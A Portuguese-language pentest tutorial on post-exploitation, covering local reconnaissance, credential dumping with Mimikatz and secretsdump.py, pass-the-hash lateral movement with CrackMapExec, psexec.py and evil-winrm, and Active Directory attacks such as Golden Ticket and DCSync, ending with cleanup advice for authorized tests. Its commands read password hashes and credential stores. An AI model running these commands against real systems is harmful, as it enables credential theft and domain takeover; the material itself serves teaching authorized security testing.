Pós-Exploração

O que é Pós-Exploração?

Pós-Exploração

Persistência, escalação de privilégios e movimento lateral após o acesso inicial.

Pós-exploração são as ações tomadas após obter acesso inicial a um sistema. O objetivo é demonstrar o impacto real da vulnerabilidade: o que um atacante real poderia fazer a partir deste ponto? Aprofundar o acesso, mover-se lateralmente e acessar dados sensíveis são as atividades típicas.

Coleta de Informações no Sistema

Após acesso inicial, mapeie o ambiente comprometido antes de qualquer movimento:

Reconhecimento local

# Linux:
whoami; id; hostname
cat /etc/passwd; cat /etc/hosts
ip addr; netstat -tulpn
ps aux | grep -v '\['

# Windows:
whoami /all
net user; net localgroup administrators
ipconfig /all
netstat -ano

Coleta de credenciais — Windows

Com privilégio SYSTEM/Administrator, é possível extrair hashes de senha do SAM e LSASS — usáveis para Pass-the-Hash ou crackeamento offline.

# Mimikatz:
privilege::debug
sekurlsa::logonpasswords  # NTLM hashes
lsadump::sam              # SAM database hashes
lsadump::lsa /patch       # Domain hashes se DC

# secretsdump.py (remoto, sem mimikatz):
secretsdump.py empresa/admin:senha@10.10.10.10

Lateral Movement

Mover-se de um sistema para outros usando as credenciais e acessos obtidos. Demonstra que o comprometimento vai além do host inicial.

Técnica Descrição Ferramenta
Pass-the-Hash (PTH)Usar hash NTLM sem saber a senha em texto claroCrackMapExec, impacket psexec
Pass-the-TicketRoubar e reutilizar tickets KerberosRubeus, mimikatz
KerberoastingRequerer tickets de service accounts e crackeá-los offlineGetUserSPNs.py, Rubeus
AS-REP RoastingAtacar contas sem pré-autenticação KerberosGetNPUsers.py, Rubeus
SMB Lateral MovementExecutar comandos em outros hosts via SMB com credenciaispsexec.py, smbexec.py, CrackMapExec
WMI / WinRMExecução remota via WMI ou Windows Remote Managementevil-winrm, wmiexec.py
 
# CrackMapExec — testar credenciais em toda a rede de uma vez:
crackmapexec smb 192.168.1.0/24 -u admin -p senha

# Pass-the-Hash com impacket:
psexec.py -hashes :aad3b4...(NTLM hash) empresa/admin@10.10.10.10

# evil-winrm para WinRM com hash:
evil-winrm -i 10.10.10.10 -u admin -H aad3b4...(NTLM hash)

Domain Dominance no Active Directory

Golden Ticket

Com acesso ao Domain Controller e o hash KRBTGT, é possível criar tickets Kerberos forjados com qualquer identidade. Persiste mesmo após reset de senhas de usuários normais. Requer reset duplo do KRBTGT para remediar.

DCSync

Com privilégios adequados, simular um Domain Controller sincronizando — o que faz o DC entregar todos os hashes de senha do domínio. Equivalente a despejar o ntds.dit sem acesso físico ao DC.

secretsdump.py -just-dc empresa/admin:senha@dc.empresa.com

Limpeza e Encerramento

Após o pentest: Remova todas as ferramentas, backdoors, usuários e arquivos que foram criados durante o teste. Documente exatamente o que foi criado para garantir limpeza completa. Nunca deixe acesso backdoor em sistemas de produção — mesmo que o cliente peça (deve ir no relatório como riscos, não como backdoor deixado).

Pós-exploração demonstra o impacto real — é o que convence stakeholders de que a vulnerabilidade é crítica. Domain Admin comprometido, banco de dados dump, exfiltração simulada — cada evidência conta. Para ferramentas desta fase, veja Metasploit e o módulo de post-exploitation.

"A pós-exploração conta a história do ataque completo. Sem ela, o relatório mostra um buraco — mas não o que passa por ele."
